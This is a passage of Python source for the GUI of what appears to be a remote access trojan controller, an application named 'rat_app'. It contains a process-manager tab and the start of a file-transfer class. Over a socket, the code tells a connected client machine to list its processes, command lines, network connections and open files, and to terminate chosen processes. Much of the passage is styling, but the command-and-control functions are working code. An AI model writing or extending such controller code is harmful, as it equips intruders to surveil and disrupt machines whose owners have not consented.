        self.refresh_thread = None
        self.stop_refresh = False
        
        # Create the UI
        self.setup_ui()
        
    def setup_ui(self):
        # Create process manager tab
        self.process_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.process_frame, text="Process Manager")  # All caps for tab name
        
        # Get theme colors from theme manager if available
        theme = self.get_theme_colors()
        
        # Store process buttons for theme updates
        self.process_buttons = []
        
        # Top control panel with brutalist styling
        control_frame = ctk.CTkFrame(self.process_frame, 
                                  fg_color=theme["card_color"],
                                  corner_radius=0,  # Square corners
                                  border_color=theme["border_color"] if "border_color" in theme else None,
                                  border_width=1 if "border_color" in theme else 0)
        control_frame.pack(fill=tk.X, padx=15, pady=15)
        self.control_frame = control_frame  # Store reference
        
        # Client info display
        client_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="CONNECTED CLIENT:",  # All caps
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]),
                                 text_color=theme["fg_color"])
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(client_frame, text="None", 
                                          font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1]),
                                          text_color=theme["fg_color"])
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Buttons for process operations with brutalist styling
        buttons_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        # Refresh button
        self.refresh_btn = ctk.CTkButton(buttons_frame, text="REFRESH PROCESSES",  # All caps
                                      command=self.refresh_processes, 
                                      width=150,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"],
                                      text_color=theme["fg_color"],
                                      bg_color=theme["bg_color"],
                                      border_color=theme["border_color"] if "border_color" in theme else None,
                                      border_width=1 if "border_color" in theme else 0,
                                      corner_radius=0,  # Square corners
                                      height=32)  # Taller button
        self.refresh_btn.pack(side=tk.LEFT, padx=5)
        self.process_buttons.append(self.refresh_btn)
        
        # Kill process button
        self.kill_btn = ctk.CTkButton(buttons_frame, text="TERMINATE PROCESS",  # All caps
                                    command=self.kill_process, 
                                    width=150,
                                    fg_color=theme["danger_color"],
                                    hover_color=theme["hover_color"],
                                    text_color="#000000",  # Black text for contrast
                                    bg_color=theme["bg_color"],
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0,
                                    corner_radius=0,  # Square corners
                                    height=32)  # Taller button
        self.kill_btn.pack(side=tk.LEFT, padx=5)
        self.process_buttons.append(self.kill_btn)
        
        # Filter frame
        filter_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, pady=10, padx=10)
        
        filter_label = ctk.CTkLabel(filter_frame, text="FILTER:",  # All caps
                                  width=50,
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                  size=FONT_STYLES["normal"][1]),
                                  text_color=theme["fg_color"])
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.filter_entry = ctk.CTkEntry(filter_frame, 
                                      corner_radius=0,  # Square corners
                                      fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                      text_color=theme["fg_color"],
                                      border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                      border_width=1)
        self.filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.filter_entry.bind("<KeyRelease>", self.apply_filter)
        
        # Auto-refresh toggle with brutalist styling
        self.auto_refresh_var = tk.BooleanVar(value=False)
        auto_refresh_check = ctk.CTkCheckBox(buttons_frame, text="AUTO REFRESH",  # All caps
                                          variable=self.auto_refresh_var,
                                          command=self.toggle_auto_refresh,
                                          checkbox_width=20,
                                          checkbox_height=20,
                                          corner_radius=0,  # Square corners
                                          fg_color=theme["accent_color"],
                                          border_color=theme["border_color"] if "border_color" in theme else None,
                                          border_width=1 if "border_color" in theme else 0,
                                          text_color=theme["fg_color"])
        auto_refresh_check.pack(side=tk.RIGHT, padx=5)
        
        # System resource usage overview with brutalist styling
        resource_frame = ctk.CTkFrame(self.process_frame, 
                                    fg_color=theme["card_color"],
                                    corner_radius=0,  # Square corners
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0)
        resource_frame.pack(fill=tk.X, padx=15, pady=10)
        self.resource_frame = resource_frame  # Store reference
        
        resource_label = ctk.CTkLabel(resource_frame, text="SYSTEM RESOURCES",  # All caps
                                    font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                    size=FONT_STYLES["subheading"][1], 
                                                    weight=FONT_STYLES["subheading"][2]),
                                    text_color=theme["fg_color"])
        resource_label.pack(anchor="w", padx=15, pady=(10, 5))
        
        resources_container = ctk.CTkFrame(resource_frame, fg_color="transparent")
        resources_container.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        # CPU usage with brutalist styling
        cpu_frame = ctk.CTkFrame(resources_container, fg_color="transparent")
        cpu_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        cpu_label = ctk.CTkLabel(cpu_frame, text="CPU USAGE:",  # All caps
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                               size=FONT_STYLES["normal"][1], 
                                               weight="bold"),
                               text_color=theme["fg_color"])
        cpu_label.pack(side=tk.LEFT, padx=5)
        
        self.cpu_value = ctk.CTkLabel(cpu_frame, text="N/A",
                                   font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                   size=FONT_STYLES["normal"][1]),
                                   text_color=theme["fg_color"])
        self.cpu_value.pack(side=tk.LEFT, padx=5)
        
        self.cpu_progress = ctk.CTkProgressBar(cpu_frame, 
                                           width=150, 
                                           height=16,  # Taller bar
                                           corner_radius=0,  # Square corners
                                           progress_color=theme["accent_color"],
                                           fg_color=theme["bg_color"],
                                           border_color=theme["border_color"] if "border_color" in theme else None,
                                           border_width=1 if "border_color" in theme else 0)
        self.cpu_progress.pack(side=tk.LEFT, padx=10)
        self.cpu_progress.set(0)
        
        # Memory usage with brutalist styling
        mem_frame = ctk.CTkFrame(resources_container, fg_color="transparent")
        mem_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        mem_label = ctk.CTkLabel(mem_frame, text="MEMORY USAGE:",  # All caps
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                               size=FONT_STYLES["normal"][1], 
                                               weight="bold"),
                               text_color=theme["fg_color"])
        mem_label.pack(side=tk.LEFT, padx=5)
        
        self.mem_value = ctk.CTkLabel(mem_frame, text="N/A",
                                   font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                   size=FONT_STYLES["normal"][1]),
                                   text_color=theme["fg_color"])
        self.mem_value.pack(side=tk.LEFT, padx=5)
        
        self.mem_progress = ctk.CTkProgressBar(mem_frame, 
                                           width=150, 
                                           height=16,  # Taller bar
                                           corner_radius=0,  # Square corners
                                           progress_color=theme["info_color"],
                                           fg_color=theme["bg_color"],
                                           border_color=theme["border_color"] if "border_color" in theme else None,
                                           border_width=1 if "border_color" in theme else 0)
        self.mem_progress.pack(side=tk.LEFT, padx=10)
        self.mem_progress.set(0)
        
        # Create TreeView for process list with a title and brutalist styling
        tree_container = ctk.CTkFrame(self.process_frame, 
                                    fg_color=theme["card_color"],
                                    corner_radius=0,  # Square corners
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0)
        tree_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(10, 15))
        self.tree_container = tree_container  # Store reference
        
        tree_title = ctk.CTkLabel(tree_container, text="PROCESSES LIST",  # All caps
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]),
                               text_color=theme["fg_color"])
        tree_title.pack(anchor="w", padx=15, pady=(10, 5))
        
        tree_frame = ctk.CTkFrame(tree_container, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        # Define columns with all caps
        columns = ("PID", "NAME", "CPU %", "MEMORY (MB)", "STATUS", "USER", "THREADS")  # All caps
        self.process_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings with sort capability
        for col in columns:
            self.process_tree.heading(col, text=col, command=lambda _col=col: self.sort_processes_by(_col))
            if col == "NAME":
                self.process_tree.column(col, width=200)
            elif col == "USER":
                self.process_tree.column(col, width=120)
            else:
                self.process_tree.column(col, width=100)
        
        # Add scrollbars with brutalist styling
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.process_tree.yview, style="Custom.Vertical.TScrollbar")
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.process_tree.xview, style="Custom.Horizontal.TScrollbar")
        self.process_tree.configure(yscroll=y_scrollbar.set, xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        self.process_tree.pack(fill=tk.BOTH, expand=True)
        
        # Context menu with brutalist styling
        self.context_menu = tk.Menu(self.process_tree, 
                                 tearoff=0, 
                                 bg=theme["card_color"],
                                 fg=theme["fg_color"],
                                 activebackground=theme["accent_color"],
                                 activeforeground="#000000")  # Black text on accent for contrast
        self.context_menu.add_command(label="REFRESH", command=self.refresh_processes)  # All caps
        self.context_menu.add_command(label="TERMINATE PROCESS", command=self.kill_process)  # All caps
        self.context_menu.add_separator()
        self.context_menu.add_command(label="VIEW DETAILS", command=self.view_process_details)  # All caps
        
        # Bind events
        self.process_tree.bind("<Button-3>", self.show_context_menu)
        self.process_tree.bind("<Double-1>", lambda e: self.view_process_details())
        
        # Apply theme to treeview
        self.apply_treeview_style()
        
        # Register widgets with ThemeManager if available
        self.register_with_theme_manager()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.process_frame)
            tm.track_widget(self.tree_container if hasattr(self, 'tree_container') else None)
            tm.track_widget(self.resource_frame if hasattr(self, 'resource_frame') else None)
            tm.track_widget(self.control_frame if hasattr(self, 'control_frame') else None)
            
            # Register buttons
            tm.track_widget(self.refresh_btn)
            tm.track_widget(self.kill_btn)
            
            # Register progress bars
            tm.track_widget(self.cpu_progress)
            tm.track_widget(self.mem_progress)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.cpu_value, "label")
            tm.track_widget(self.mem_value, "label")
            
            # Register treeview
            tm.track_widget(self.process_tree, "treeview")
            
            # Register menu
            tm.track_widget(self.context_menu, "menu")

    def apply_treeview_style(self):
        style = ttk.Style()
        theme = self.get_theme_colors()
        bg_color = theme["bg_color"]
        fg_color = theme["fg_color"]
        card_color = theme["card_color"]
        hover_color = theme["hover_color"]
        
        # Reset the style first to avoid inheritance issues
        style.layout("Custom.Treeview", [('Custom.Treeview.treearea', {'sticky': 'nswe'})])
        
        # Configure the treeview style with brutalist elements
        style.configure("Custom.Treeview", 
                        background=card_color,
                        foreground=theme["fg_color"],
                        fieldbackground=card_color,
                        font=FONT_STYLES["normal"],
                        rowheight=28,  # Taller rows
                        borderwidth=1,  # Add border
                        relief="flat",
                        highlightthickness=0)
        
        # Configure the treeview heading style
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["fg_color"],  # Use theme foreground color
                        font=("Segoe UI", 10, "bold"),
                        relief="flat")
        
        # Configure selection colors - ensure proper background color mapping
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])  # Black text on selection
        
        # Configure scrollbars
        style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["button_color"],  # Use button color
                        troughcolor=bg_color,
                        arrowcolor=theme["accent_color"])  # Use accent color for arrows
        
        style.configure("Custom.Horizontal.TScrollbar", 
                        background=theme["button_color"],  # Use button color
                        troughcolor=bg_color,
                        arrowcolor=theme["accent_color"])  # Use accent color for arrows
        
    
    def update_client_info(self):
        """Update the client info when a client is selected"""
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                    return
        
        self.client_info_label.configure(text="None")
        
    def refresh_processes(self):
        """Request and refresh the process list from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            # Clear existing items
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
            
            # Update client info
            self.update_client_info()
            
            # Send command to client to get process list
            self.rat_app.log("Sending PROCESS_LIST command to client")
            self.rat_app.current_client_socket.send(b'PROCESS_LIST')
            
            # Get response size with improved error handling
            try:
                size_data = self.rat_app.current_client_socket.recv(8)
                if not size_data or len(size_data) != 8:
                    self.rat_app.log(f"Error: Received invalid size data: {size_data}")
                    return
                    
                response_size = struct.unpack('Q', size_data)[0]
                self.rat_app.log(f"Expected response size: {response_size} bytes")
                
                # Receive process list data with proper timeout and error handling
                data = b""
                buffer_size = self.rat_app.BUFFER
                
                while len(data) < response_size:
                    chunk = self.rat_app.current_client_socket.recv(min(response_size - len(data), buffer_size))
                    if not chunk:
                        self.rat_app.log("Connection broken while receiving data")
                        break
                    data += chunk
                    
                if len(data) != response_size:
                    self.rat_app.log(f"Warning: Received {len(data)} bytes instead of expected {response_size} bytes")
                
                # Try to parse the JSON data with better error handling
                try:
                    # Log a small part of the received data for debugging
                    self.rat_app.log(f"First 100 bytes of received data: {data[:100]}")
                    
                    process_data = json.loads(data.decode('utf-8'))
                    
                    # Check for error
                    if isinstance(process_data, str) and process_data.startswith("ERROR:"):
                        self.rat_app.log(process_data)
                        return
                        
                    # Update system resource info
                    if 'system' in process_data:
                        sys_info = process_data['system']
                        self.update_resource_info(sys_info)
                    
                    # Store the full process list
                    self.process_list = process_data['processes']
                    
                    # Display processes
                    self.update_process_tree(self.process_list)
                    
                    self.rat_app.log(f"Retrieved {len(self.process_list)} processes from client")
                    
                except json.JSONDecodeError as e:
                    self.rat_app.log(f"Error decoding JSON: {e}")
                    self.rat_app.log(f"First 100 bytes of received data: {data[:100]}")
                    
            except Exception as inner_e:
                self.rat_app.log(f"Error receiving data: {inner_e}")
                
        except Exception as e:
            self.rat_app.log(f"Error refreshing processes: {e}")
    
    def update_resource_info(self, sys_info):
        """Update system resource information display"""
        try:
            # Update CPU info
            cpu_percent = sys_info.get('cpu_percent', 0)
            self.cpu_value.configure(text=f"{cpu_percent:.1f}%")
            self.cpu_progress.set(cpu_percent / 100)
            
            # Update memory info
            mem_percent = sys_info.get('memory_percent', 0)
            mem_used = sys_info.get('memory_used', 0)
            mem_total = sys_info.get('memory_total', 0)
            
            # Format memory values
            if mem_total > 0:
                mem_used_gb = mem_used / (1024 * 1024 * 1024)
                mem_total_gb = mem_total / (1024 * 1024 * 1024)
                self.mem_value.configure(text=f"{mem_used_gb:.1f} GB / {mem_total_gb:.1f} GB ({mem_percent:.1f}%)")
                self.mem_progress.set(mem_percent / 100)
        except Exception as e:
            self.rat_app.log(f"Error updating resource info: {e}")
    
    def update_process_tree(self, processes):
        """Update the process tree with the given process list"""
        try:
            # Clear existing items
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
            
            # Apply filter if there is any text in the filter entry
            filter_text = self.filter_entry.get().lower()
            
            # Add processes to treeview
            for process in processes:
                # Apply filter
                if filter_text and filter_text not in process['name'].lower() and filter_text not in str(process['pid']):
                    continue
                
                # Format memory in MB
                memory_mb = process['memory'] / (1024 * 1024) if 'memory' in process else 0
                
                # Insert into treeview
                self.process_tree.insert("", "end", values=(
                    process['pid'],
                    process['name'],
                    f"{process.get('cpu_percent', 0):.1f}",
                    f"{memory_mb:.1f}",
                    process.get('status', 'Unknown'),
                    process.get('username', 'Unknown'),
                    process.get('threads', 0)
                ))
        except Exception as e:
            self.rat_app.log(f"Error updating process tree: {e}")
    
    def apply_filter(self, event=None):
        """Apply filter to the process list"""
        if hasattr(self, 'process_list') and self.process_list:
            self.update_process_tree(self.process_list)
    
    def kill_process(self):
        """Terminate the selected process on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        selection = self.process_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a process to terminate")
            return
        
        # Get PID from selection
        selected_values = self.process_tree.item(selection[0])["values"]
        pid = selected_values[0]
        process_name = selected_values[1]
        
        # Confirm termination
        if not messagebox.askyesno("Confirm", f"Are you sure you want to terminate '{process_name}' (PID: {pid})?"):
            return
        
        try:
            # Send command to terminate process
            command = f"KILL_PROCESS|{pid}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get response
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.rat_app.log(f"Successfully terminated process {process_name} (PID: {pid})")
                
                # Refresh process list
                self.refresh_processes()
            else:
                self.rat_app.log(f"Failed to terminate process: {response}")
                messagebox.showerror("Error", f"Failed to terminate process: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error terminating process: {e}")
            messagebox.showerror("Error", f"Error terminating process: {e}")
    
    def view_process_details(self):
        """Show detailed information for the selected process with brutalist styling"""
        if not self.process_list:
            return
        
        selection = self.process_tree.selection()
        if not selection:
            return
        
        # Get PID from selection
        selected_values = self.process_tree.item(selection[0])["values"]
        pid = selected_values[0]
        
        # Find process in list
        process_info = None
        for process in self.process_list:
            if process['pid'] == pid:
                process_info = process
                break
        
        if not process_info:
            messagebox.showinfo("NOT FOUND", "Process information not found")  # All caps
            return
        
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Create details dialog with brutalist styling
        details_window = ctk.CTkToplevel(self.rat_app.root)
        details_window.title(f"PROCESS DETAILS: {process_info['name'].upper()}")  # All caps
        details_window.geometry("600x400")
        details_window.grab_set()  # Modal dialog
        
        # Main frame with brutalist styling
        frame = ctk.CTkFrame(details_window, 
                          fg_color=theme["bg_color"],
                          corner_radius=0)  # Square corners
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title with brutalist styling
        title = ctk.CTkLabel(frame, 
                          text=f"PROCESS: {process_info['name'].upper()} (PID: {process_info['pid']})",  # All caps
                          font=ctk.CTkFont(size=16, weight="bold"),
                          text_color=theme["fg_color"])
        title.pack(pady=10)
        
        # Process information in a scrollable text area with brutalist styling
        details_frame = ctk.CTkFrame(frame, 
                                  fg_color=theme["card_color"],
                                  corner_radius=0,  # Square corners
                                  border_color=theme["border_color"] if "border_color" in theme else None,
                                  border_width=1 if "border_color" in theme else 0)
        details_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        details_text = ctk.CTkTextbox(details_frame, 
                                    height=250, 
                                    fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                    text_color=theme["fg_color"],
                                    corner_radius=0,  # Square corners
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0)
        details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add process details
        details_text.insert(tk.END, f"PROCESS ID: {process_info['pid']}\n")  # All caps labels
        details_text.insert(tk.END, f"NAME: {process_info['name']}\n")
        details_text.insert(tk.END, f"EXECUTABLE: {process_info.get('exe', 'Unknown')}\n")
        details_text.insert(tk.END, f"STATUS: {process_info.get('status', 'Unknown')}\n")
        details_text.insert(tk.END, f"USER: {process_info.get('username', 'Unknown')}\n")
        details_text.insert(tk.END, f"CPU USAGE: {process_info.get('cpu_percent', 0):.2f}%\n")
        
        # Format memory
        memory_mb = process_info.get('memory', 0) / (1024 * 1024)
        details_text.insert(tk.END, f"MEMORY USAGE: {memory_mb:.2f} MB\n")
        
        details_text.insert(tk.END, f"THREADS: {process_info.get('threads', 0)}\n")
        details_text.insert(tk.END, f"CREATED: {process_info.get('create_time', 'Unknown')}\n")
        
        # Command line
        details_text.insert(tk.END, f"\nCOMMAND LINE:\n{process_info.get('cmdline', 'Unknown')}\n")
        
        # Network connections if available
        if 'connections' in process_info and process_info['connections']:
            details_text.insert(tk.END, f"\nNETWORK CONNECTIONS:\n")
            for conn in process_info['connections']:
                details_text.insert(tk.END, f"- {conn}\n")
        
        # Open files if available
        if 'open_files' in process_info and process_info['open_files']:
            details_text.insert(tk.END, f"\nOPEN FILES:\n")
            for file in process_info['open_files']:
                details_text.insert(tk.END, f"- {file}\n")
        
        details_text.configure(state="disabled")  # Make read-only
        
        # Store process buttons for this window
        detail_buttons = []
        
        # Action buttons with brutalist styling
        button_frame = ctk.CTkFrame(frame, fg_color="transparent")
        button_frame.pack(fill=tk.X, pady=10)
        
        refresh_btn = ctk.CTkButton(button_frame, 
                                  text="REFRESH",  # All caps
                                  command=lambda: self.refresh_process_details(details_text, process_info['pid']),
                                  fg_color=theme["button_color"],
                                  hover_color=theme["hover_color"],
                                  text_color=theme["fg_color"],
                                  border_color=theme["border_color"] if "border_color" in theme else None,
                                  border_width=1 if "border_color" in theme else 0,
                                  corner_radius=0,  # Square corners
                                  height=32)  # Taller button
        refresh_btn.pack(side=tk.LEFT, padx=5)
        detail_buttons.append(refresh_btn)
        
        kill_btn = ctk.CTkButton(button_frame, 
                               text="TERMINATE PROCESS",  # All caps
                               command=lambda: [self.kill_process(), details_window.destroy()],
                               fg_color=theme["danger_color"],
                               hover_color=theme["hover_color"],
                               text_color="#000000",  # Black text for contrast
                               border_color=theme["border_color"] if "border_color" in theme else None,
                               border_width=1 if "border_color" in theme else 0,
                               corner_radius=0,  # Square corners
                               height=32)  # Taller button
        kill_btn.pack(side=tk.LEFT, padx=5)
        detail_buttons.append(kill_btn)
        
        close_btn = ctk.CTkButton(button_frame, 
                                text="CLOSE",  # All caps
                                command=details_window.destroy,
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                corner_radius=0,  # Square corners
                                height=32)  # Taller button
        close_btn.pack(side=tk.RIGHT, padx=5)
        detail_buttons.append(close_btn)

    
    def refresh_process_details(self, text_widget, pid):
        """Refresh the details for a specific process"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            # Send command to get specific process details
            command = f"PROCESS_DETAILS|{pid}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get response size
            size_data = self.rat_app.current_client_socket.recv(8)
            response_size = struct.unpack('Q', size_data)[0]
            
            # Receive process details data
            data = b""
            buffer_size = self.rat_app.BUFFER
            
            while len(data) < response_size:
                chunk = self.rat_app.current_client_socket.recv(min(response_size - len(data), buffer_size))
                if not chunk:
                    break
                data += chunk
            
            process_info = json.loads(data.decode('utf-8'))
            
            # Check for error
            if isinstance(process_info, str) and process_info.startswith("ERROR:"):
                self.rat_app.log(process_info)
                return
            
            # Update text widget with new information
            text_widget.configure(state="normal")
            text_widget.delete(1.0, tk.END)
            
            # Add process details (same as in view_process_details)
            text_widget.insert(tk.END, f"Process ID: {process_info['pid']}\n")
            text_widget.insert(tk.END, f"Name: {process_info['name']}\n")
            text_widget.insert(tk.END, f"Executable: {process_info.get('exe', 'Unknown')}\n")
            text_widget.insert(tk.END, f"Status: {process_info.get('status', 'Unknown')}\n")
            text_widget.insert(tk.END, f"User: {process_info.get('username', 'Unknown')}\n")
            text_widget.insert(tk.END, f"CPU Usage: {process_info.get('cpu_percent', 0):.2f}%\n")
            
            # Format memory
            memory_mb = process_info.get('memory', 0) / (1024 * 1024)
            text_widget.insert(tk.END, f"Memory Usage: {memory_mb:.2f} MB\n")
            
            text_widget.insert(tk.END, f"Threads: {process_info.get('threads', 0)}\n")
            text_widget.insert(tk.END, f"Created: {process_info.get('create_time', 'Unknown')}\n")
            
            # Command line
            text_widget.insert(tk.END, f"\nCommand Line:\n{process_info.get('cmdline', 'Unknown')}\n")
            
            # Network connections if available
            if 'connections' in process_info and process_info['connections']:
                text_widget.insert(tk.END, f"\nNetwork Connections:\n")
                for conn in process_info['connections']:
                    text_widget.insert(tk.END, f"- {conn}\n")
            
            # Open files if available
            if 'open_files' in process_info and process_info['open_files']:
                text_widget.insert(tk.END, f"\nOpen Files:\n")
                for file in process_info['open_files']:
                    text_widget.insert(tk.END, f"- {file}\n")
            
            text_widget.configure(state="disabled")  # Make read-only
            
        except Exception as e:
            self.rat_app.log(f"Error refreshing process details: {e}")
    
    def sort_processes_by(self, column):
        """Sort the process list by the given column"""
        # Get all items
        item_list = [(self.process_tree.set(k, column), k) for k in self.process_tree.get_children('')]
        
        try:
            # Try to sort numerically for certain columns
            if column in ["PID", "CPU %", "Memory (MB)", "Threads"]:
                item_list.sort(key=lambda x: float(x[0].replace("%", "").strip()))
            else:
                # Sort alphabetically
                item_list.sort()
        except Exception:
            # Fall back to alphabetical sort
            item_list.sort()
        
        # Rearrange items in sorted positions
        for index, (val, k) in enumerate(item_list):
            self.process_tree.move(k, '', index)
    
    def show_context_menu(self, event):
        """Show the context menu on right-click"""
        if self.process_tree.selection():
            self.context_menu.post(event.x_root, event.y_root)
    
    def toggle_auto_refresh(self):
        """Toggle automatic refreshing of the process list"""
        self.auto_refresh = self.auto_refresh_var.get()
        
        if self.auto_refresh:
            self.stop_refresh = False
            
            if not self.refresh_thread or not self.refresh_thread.is_alive():
                self.refresh_thread = threading.Thread(target=self.auto_refresh_thread, daemon=True)
                self.refresh_thread.start()
                
            self.rat_app.log(f"Auto-refresh enabled (interval: {self.auto_refresh_interval}s)")
        else:
            self.stop_refresh = True
            self.rat_app.log("Auto-refresh disabled")
    
    def auto_refresh_thread(self):
        """Thread function for auto-refreshing process list"""
        while self.auto_refresh and not self.stop_refresh:
            # Only refresh if the tab is visible
            if self.rat_app.notebook.index(self.rat_app.notebook.select()) == self.rat_app.notebook.index(self.process_frame):
                self.process_frame.after(0, self.refresh_processes)
            
            # Wait for the refresh interval
            for _ in range(self.auto_refresh_interval * 2):  # Check every 0.5 seconds if we should stop
                if self.stop_refresh:
                    break
                time.sleep(0.5)
    
    def debug_json_data(self, data):
        """Helper method to debug JSON data parsing issues"""
        try:
            # Try to decode and pretty-print a small sample
            sample = data[:min(500, len(data))].decode('utf-8', errors='replace')
            self.rat_app.log(f"Sample data: {sample}")
            
            # Try to parse JSON
            parsed = json.loads(data.decode('utf-8'))
            self.rat_app.log("JSON parsed successfully")
            
            # Check structure
            if 'system' in parsed:
                self.rat_app.log("'system' key found")
            if 'processes' in parsed:
                self.rat_app.log(f"'processes' key found with {len(parsed['processes'])} items")
            
            return True
        except json.JSONDecodeError as e:
            self.rat_app.log(f"JSON decode error: {e}")
            # Try to identify where the error occurs
            error_pos = e.pos
            self.rat_app.log(f"Error at position {error_pos}")
            self.rat_app.log(f"Data around error: {data[max(0, error_pos-20):error_pos+20].decode('utf-8', errors='replace')}")
            return False
        except Exception as e:
            self.rat_app.log(f"Other error: {e}")
            return False
                
    def update_process_buttons(self):
        """Update all process buttons to match the current theme"""
        if hasattr(self, 'process_buttons') and len(self.process_buttons) > 0:
            theme = self.get_theme_colors()
            
            for btn in self.process_buttons:
                # Check button text to determine type
                btn_text = btn.cget("text")
                
                if btn_text == "TERMINATE PROCESS":
                    # Danger button
                    btn.configure(
                        fg_color=theme["danger_color"],
                        hover_color=theme["hover_color"],
                        text_color="#000000",  # Black text for contrast
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0  # Ensure square corners
                    )
                else:
                    # Regular button
                    btn.configure(
                        fg_color=theme["button_color"],
                        hover_color=theme["hover_color"],
                        text_color=theme["fg_color"],
                        border_color=theme["border_color"] if "border_color" in theme else None,
                        border_width=1 if "border_color" in theme else 0,
                        corner_radius=0  # Ensure square corners
                    )
            
            # Update context menu
            if hasattr(self, 'context_menu'):
                self.context_menu.configure(
                    bg=theme["card_color"],
                    fg=theme["fg_color"],
                    activebackground=theme["accent_color"],
                    activeforeground="#000000"  # Black text for contrast
                )
                
                
class FileTransferSystem:
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.current_transfer = None
        self.stop_transfer = False
        self.is_paused = False  # Initialize the is_paused attribute
        self.CHUNK_SIZE = 4096
        self.transfer_progress = 0
        self.transfer_states = {}
        self.show_hidden_files = False
        self.current_sort_column = "Name"
        self.sort_direction = "ascending"
        
        # Load saved transfer states
        self.load_transfer_states()
        
        # Create the UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register all frame types
            for widget in [
                self.file_frame, self.client_card, self.status_card, 
                self.upload_frame, self.download_frame, self.source_card, 
                self.dest_card, self.info_card, self.queue_frame,
